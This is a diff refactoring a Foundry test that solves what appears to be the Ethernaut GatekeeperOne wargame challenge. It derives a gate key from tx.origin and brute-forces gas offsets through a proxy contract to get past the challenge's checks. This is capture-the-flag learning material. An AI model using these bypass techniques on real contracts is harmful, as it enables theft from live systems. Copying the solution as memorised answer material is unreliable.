@@ -4,6 +4,13 @@ pragma solidity >=0.8.0;
 import "forge-std/Test.sol";
 import "../utils.sol";
 
+// for this challenge, player needs to be tx.origin
+// let's skip the middleman just once.
+interface IFactory {
+  function createInstance(address _player) external payable returns (address);
+  function validateInstance(address payable _instance, address _player) external returns (bool);
+}
+
 contract Proxy {
   address internal challengeAddress;
 
@@ -18,18 +25,12 @@ contract Proxy {
 }
 
 contract GatekeeperOneTest is Test {
-  address internal factoryAddress;
+  IFactory internal challengeFactory;
   address internal challengeAddress;
 
   function setUp() public {
-    // for this challenge, player needs to be tx.origin
-    // let's skip the middleman just this time.
-    factoryAddress = 0x9b261b23cE149422DE75907C6ac0C30cEc4e652A;
-    (,bytes memory data) =
-      factoryAddress.call(
-        abi.encodeWithSignature("createInstance(address)", tx.origin));
-
-    challengeAddress = abi.decode(data, (address));
+    challengeFactory = IFactory(0x9b261b23cE149422DE75907C6ac0C30cEc4e652A);
+    challengeAddress = challengeFactory.createInstance(tx.origin);
   }
 
   function testExploit() public {
@@ -56,18 +57,12 @@ contract GatekeeperOneTest is Test {
     //      in fact, it can be 0x100000000000ea72,
     //      which makes it straighforward to get analytically.
 
+    Proxy proxy = new Proxy(challengeAddress);
     bytes8 key = bytes8(uint16(uint160(tx.origin)) + 0x1000000000000000);
 
-    Proxy proxy = new Proxy(challengeAddress);
-
     for (uint i = 0; i < 8191; i++) {
-      bool success = proxy.enter{gas: (8191 * 3) + i}(key);
-      if (success) {
-        (,bytes memory data) =
-          factoryAddress.call(
-            abi.encodeWithSignature("validateInstance(address,address)", challengeAddress, tx.origin));
-        bool instanceValid = abi.decode(data, (bool));
-        require(instanceValid);
+      if (proxy.enter{gas: (8191 * 3) + i}(key)) {
+        require(challengeFactory.validateInstance(payable(challengeAddress), tx.origin));
         break;
       }
     }
